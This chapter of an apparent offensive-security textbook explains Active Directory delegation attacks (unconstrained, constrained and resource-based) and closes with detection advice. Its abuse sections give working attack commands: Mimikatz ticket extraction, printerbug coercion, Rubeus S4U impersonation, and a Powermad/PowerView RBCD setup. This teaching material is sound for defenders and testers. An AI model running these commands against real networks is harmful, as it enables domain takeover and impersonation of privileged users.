# Chapter 12: Delegation Attacks

Delegation in Active Directory allows a service to impersonate a user to access resources on behalf of that user. While delegation is a powerful feature for enabling seamless user experiences, it is also one of the most dangerous attack vectors in Active Directory. Misconfigured delegation can lead to complete domain compromise.

## Unconstrained Delegation

Unconstrained delegation allows a service (usually running on a computer) to impersonate any user who authenticates to it, without restriction.

### How it works
1. A user authenticates to a service hosted on a computer with unconstrained delegation enabled.
2. The Domain Controller (DC) issues a Ticket Granting Ticket (TGT) for the user to the service.
3. The service caches the TGT in its memory.
4. An attacker who compromises the service (or the computer) can extract the cached TGTs from memory (e.g., using Mimikatz).
5. The attacker can then use the extracted TGTs to impersonate the users on any other service in the domain.

### Identifying Unconstrained Delegation

```powershell
# PowerShell (using PowerView)
Get-DomainComputer -Unconstrained -Properties dnshostname
```

### Exploiting Unconstrained Delegation

1. **Wait for a high-privileged user**: The attacker must wait for a high-privileged user (e.g., a Domain Admin) to authenticate to the compromised service.
2. **Extract the TGT**: Use Mimikatz to extract the cached TGTs.

```text
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

3. **Use the TGT**: Use the extracted TGT to impersonate the user.

```text
# Mimikatz
mimikatz # kerberos::ptt <Ticket_File>
```

4. **Force authentication (optional)**: If no high-privileged users are authenticating, the attacker can force a Domain Controller to authenticate to the compromised service (e.g., using the SpoolService bug via printerbug.py).

```bash
# Using Impacket (printerbug.py)
python3 printerbug.py <Domain>/<Username>:<Password>@<TargetComputer> <AttackerComputer>
```

## Constrained Delegation

Constrained delegation allows a service to impersonate a user only to access specific services (defined by Service Principal Names - SPNs) on specific computers.

### How it works
1. A user authenticates to a service hosted on a computer with constrained delegation enabled.
2. The service uses the `S4U2Self` (Service for User to Self) protocol to request a Service Ticket (ST) for the user from the DC.
3. The service then uses the `S4U2Proxy` (Service for User to Proxy) protocol to request an ST for the target service using the ST obtained in step 2.
4. The service presents the ST to the target service to access the resource on behalf of the user.

### Identifying Constrained Delegation

```powershell
# PowerShell (using PowerView)
Get-DomainUser -TrustedToAuth -Properties dnshostname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth -Properties dnshostname, msds-allowedtodelegateto
```

### Exploiting Constrained Delegation

1. **Obtain the service account's hash**: The attacker must compromise the service account (e.g., via Kerberoasting or LSASS dumping).
2. **Use Rubeus**: Use Rubeus to perform the `S4U2Self` and `S4U2Proxy` attacks.

```powershell
# PowerShell (using Rubeus)
Rubeus.exe s4u /user:<ServiceAccount> /rc4:<ServiceHash> /impersonateuser:<TargetUser> /msdsspn:"CIFS/<TargetComputer>" /ptt
```

3. **Access the target service**: Use the injected ticket to access the target service (e.g., CIFS).

```cmd
# Command Prompt
dir \\<TargetComputer>\C$
```

## Resource-Based Constrained Delegation (RBCD)

Resource-Based Constrained Delegation (RBCD) allows the owner of a resource (e.g., a computer) to define which services can impersonate users to access that resource.

### How it works
1. A service (or computer) is configured to allow another service (or computer) to impersonate users to access it.
2. When a user authenticates to the first service, it uses `S4U2Self` and `S4U2Proxy` to request an ST for the user from the DC.
3. The first service presents the ST to the second service to access the resource on behalf of the user.

### Identifying RBCD

```powershell
# PowerShell (using PowerView)
Get-DomainComputer -Properties msds-allowedtoactonbehalfofotheridentity
```

### Exploiting RBCD

1. **Create a new computer account**: If the attacker has `MachineAccountQuota` > 0, they can create a new computer account.
2. **Configure RBCD**: Configure the new computer account to be allowed to act on behalf of the target computer.

```powershell
# PowerShell (using PowerSploit)
. .\Powermad.ps1
New-MachineAccount -MachineAccount <NewComputer> -Password $(ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)
. .\PowerView.ps1
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<NewComputer_SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TargetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

3. **Obtain the new computer account's hash**: Kerberoast the new computer account or extract its hash.
4. **Use Rubeus**: Use Rubeus to perform the `S4U2Self` and `S4U2Proxy` attacks.

```powershell
# PowerShell (using Rubeus)
Rubeus.exe s4u /user:<NewComputer$> /rc4:<NewComputerHash> /impersonateuser:<TargetUser> /msdsspn:"CIFS/<TargetComputer>" /ptt
```

5. **Access the target computer**: Use the injected ticket to access the target computer (e.g., CIFS).

```cmd
# Command Prompt
dir \\<TargetComputer>\C$
```

## Delegation Abuse Attack Chains

Delegation attacks are often combined with other techniques to create powerful attack chains:

1. **Initial Access**: Gain access to a standard user account (e.g., via phishing).
2. **Privilege Escalation**: Escalate to a service account (e.g., via Kerberoasting).
3. **Delegation Exploitation**: Use the service account's hash to exploit unconstrained or constrained delegation.
4. **Lateral Movement**: Use the extracted or forged tickets to move laterally to the Domain Controller.

## Detection

### Detection Methods
- **Unconstrained Delegation**: Monitor for computers with the `TRUSTED_FOR_DELEGATION` flag set. Look for TGT requests for these computers.
- **Constrained Delegation**: Monitor for `S4U2Self` and `S4U2Proxy` requests in Kerberos logs (Event ID 4769).
- **RBCD**: Monitor for modifications to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on computer accounts.

---
*Delegation attacks provide a direct path to the Domain Controller. The next chapter will explore trust attacks, which allow attackers to move between different domains and forests.*
